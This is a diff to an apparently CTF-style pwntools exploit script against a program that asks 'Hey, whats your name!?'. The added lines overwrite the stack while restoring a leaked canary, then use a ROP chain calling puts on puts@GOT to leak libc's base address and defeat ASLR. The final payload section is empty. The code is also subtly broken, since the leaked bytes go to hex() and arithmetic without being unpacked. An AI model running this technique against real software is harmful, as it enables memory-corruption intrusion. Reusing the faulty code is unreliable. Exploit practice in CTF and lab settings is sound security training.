@@ -151,4 +151,21 @@ pause()
 # 3 - Leak libc's address with `puts` to defeat ALSR
 
 payload = b"A" * overflow_to_canary
+payload += p64(u64(found_canary))
+payload += b"B" * 8  # Saved RBP
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+
+p.sendafter(b"Hey, whats your name!?\n\n", payload)
+leak_puts = p.recv(6).ljust(8, b"\x00")
+info(f"leak_puts = {hex(leak_puts)}")
+libc_base = leak_puts - e.libc.symbols["puts"]
+info(f"libc_base = {hex(libc_base)}")
+
+pause()
+
+# FINAL PAYLOAD
+
+
 p.interactive()
